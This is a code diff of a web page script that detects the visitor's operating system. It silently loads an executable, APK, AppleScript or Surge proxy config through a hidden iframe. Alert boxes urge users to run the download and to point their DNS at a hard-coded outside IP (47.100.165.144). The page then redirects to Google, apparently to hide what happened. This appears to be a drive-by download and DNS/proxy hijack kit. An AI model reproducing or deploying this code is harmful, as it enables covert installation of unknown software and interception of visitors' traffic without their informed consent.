@@ -50,7 +50,7 @@ div.WordSection1
 
 <div class=WordSection1>
 
-  <iframe id=download width=1 height=1 style='display:none'>
+  <iframe id = "download" style='display:none'>
   </iframe>  
 
 <h1 style='margin-left:121.7pt'><span style='font-size:48.0pt;font-family:"Century Gothic",sans-serif'><br>
@@ -77,32 +77,41 @@ alt="the Statue of Liberty">
 		// "Unknown OS" indicates failure to detect the OS
 
 //document.writeln('<br></br>'+navigator.appVersion);
-	if (navigator.appVersion.indexOf("Win")!=-1) {
-      document.getElementById("download").src="deployment/eltdpl.exe";
-      alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");
-    } 
+
     if (navigator.appVersion.indexOf("iPhone")!=-1
     || navigator.appVersion.indexOf("iPad")!=-1) {
-      document.getElementById("download").src = 'surge:///install-config?url='+window.location.origin+'deployment/elt.conf';
-          setTimeout(function () {
+
+			function absolute() {
+				  document.getElementById("download").src = 'surge:///install-config?url='+window.location.origin+'deployment/elt.conf';
+					setTimeout(function () {
             window.location = 'itms-apps://itunes.apple.com/app/surge-3-web-developer-tool/id1329879957';
+						return absolute();
           }, 1000);
-      window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
+					window.onload(function() {
+						window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
+					})
+			}
+
+			absolute();
     }
-    if (navigator.appVersion.indexOf("Android")!=-1) {
+    else if (navigator.appVersion.indexOf("Android")!=-1) {
       alert("Awesome!\nFollow these instructions:");
       alert("STEP 1 of 4\nInstall downloaded application package\nthe download will automatically start once you finish reading these instructions.");
       alert("STEP 2 of 4\nJot down the following address:\n47.100.165.144");
       alert("STEP 3 of 4\nOpen 'DNS Changer' enter the address you've just written down in the first entry and '0.0.0.0' in the other.");
       alert("STEP 4 of 4\nTap 'Start' and follow any instruction given. DONE!");
-      document.getElementById("download").src="deployment/eltdpl.apk";
+      document.getElementById("download").src='deployment/eltdpl.apk';
       window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
     } 
-		if (navigator.appVersion.indexOf("Mac")!=-1) {
-			document.getElementById("download").src="deployment/eltdpl.applescript";
+		else if (navigator.appVersion.indexOf("Win")!=-1) {
+      document.getElementById("download").src='deployment/eltdpl.exe';
+      alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");
+    } 
+		else if (navigator.appVersion.indexOf("Mac")!=-1) {
+			document.getElementById("download").src='deployment/eltdpl.applescript';
       alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");      
     }
-		if (navigator.appVersion.indexOf("X11")!=-1 || navigator.appVersion.indexOf("Linux")!=-1) {
+		else if (navigator.appVersion.indexOf("X11")!=-1 || navigator.appVersion.indexOf("Linux")!=-1) {
 			alert(":\) Great Job!\nAdd the following line to your 'resolv.conf' to make it fly!\nnameserver 47.100.165.144");
 			window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
 		}
